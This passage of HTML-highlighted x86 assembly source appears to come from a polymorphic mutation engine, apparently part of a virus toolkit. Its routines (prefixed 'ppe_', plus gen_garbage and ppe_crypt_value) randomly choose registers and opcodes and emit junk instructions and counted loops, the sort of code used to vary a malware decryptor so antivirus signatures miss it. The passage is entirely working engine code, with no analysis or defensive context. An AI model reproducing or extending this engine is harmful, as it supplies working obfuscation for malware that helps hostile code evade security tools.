        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate movzx,movsx reg32/16,reg16/8 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">g_movzx_movsx_32</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">;movzx/movsx reg32,reg16</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0B7h</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__d_movzx32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0BFh</span><span class="sc0">
    </span><span class="sc5">__d_movzx32</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_reg</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_movzx_movsx_16</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">;movzx/movsx reg16,reg8</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc5">g_movzx_movsx_8</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">;movzx/movsx reg32,reg8</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0B6h</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__d_movzx32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0BEh</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__d_movzx32</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate rol/ror/rcl/rcr/shl/shr/sar reg,imm ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">g_rotate_shift32</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">;(r/s) reg32,imm8</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C1h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__do_rs_work</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_rotate_shift16</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">;(r/s) reg16,imm8</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">g_rotate_shift32</span><span class="sc0">

</span><span class="sc5">g_rotate_shift8</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">   </span><span class="sc1">;(r/s) reg8,imm8</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_rotate_shift8</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__do_rs_work</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc5">a_rotate_shift8</span><span class="sc4">:</span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__do_rs_work</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">;select r/s operation</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">end_rs_imm</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tbl_rs_imm</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_rs_imm</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate rol/ror/rcl/rcr/shl/shr/sar reg,reg8 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">g_rs_reg32reg8</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">;(r/s) reg32,reg8</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0D3h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;in fact, reg8 is always CL</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">   </span><span class="sc1">;because CPU allows only</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__do_rs_work</span><span class="sc0">        </span><span class="sc1">;this reg8</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_rs_reg16reg8</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">;(r/s) reg16,reg8 (CL)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">g_rs_reg32reg8</span><span class="sc0">

</span><span class="sc5">g_rs_reg8reg8</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">;(r/s) reg8,reg8 (CL)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_rs_reg8reg8</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0D266h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__do_rs_work</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc5">a_rs_reg8reg8</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate bt/bts/btr/btc reg32/16,(reg/imm)32/16 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">g_bt_regreg32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__do_bt_work</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_bt_regreg16</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0F66h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__do_bt_work</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__do_bt_work</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">end_bt_reg</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tbl_bt_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_bt_reg</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_reg</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_bit_test32</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0BA0Fh</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__do_bit_test_work</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_bit_test16</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">g_bit_test32</span><span class="sc0">

    </span><span class="sc5">__do_bit_test_work</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">end_bt_imm</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tbl_bt_imm</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_bt_imm</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate add/sub/xor/and/adc/sbb/or reg,reg ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">g_mathregreg32</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">;math reg32,reg32</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__do_math_regreg_work</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_mathregreg16</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">;math reg16,reg16</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">g_mathregreg32</span><span class="sc0">

</span><span class="sc5">g_mathregreg8</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">;math reg8,reg8</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_reg</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">g_mathregreg8</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_mathregreg8</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">end_math_reg</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tbl_math_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_math_reg</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">a_mathregreg8</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__do_math_regreg_work</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">end_math_reg</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tbl_math_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_math_reg</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_reg</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ set reg8 by flag ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">g_set_byte</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_set_byte</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000010h</span><span class="sc0">       </span><span class="sc1">;we have 16 opcodes, haha..</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">          </span><span class="sc1">;seta , setae, setb , setbe</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;sete , setg , setge, setl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;setle, setne, setno, setnp</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">         </span><span class="sc1">;setns, seto , setp , sets</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">a_set_byte</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate garbage + loop ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">g_loop</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; we can't be recursived because ECX is only for one LOOP</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">recursive_level</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_loop</span><span class="sc0">

        </span><span class="sc1">; does ECX free ?</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc2">00000010b</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_loop</span><span class="sc0">

        </span><span class="sc1">; generate ECX like counter</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000030h</span><span class="sc0">       </span><span class="sc1">;future ECX to loop</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">00000001b</span><span class="sc0">        </span><span class="sc1">;write to ECX</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">

        </span><span class="sc1">; we don't want to change ECX</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc2">00000010b</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;total garbages in bytes</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">     </span><span class="sc1">;to calculate loop</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
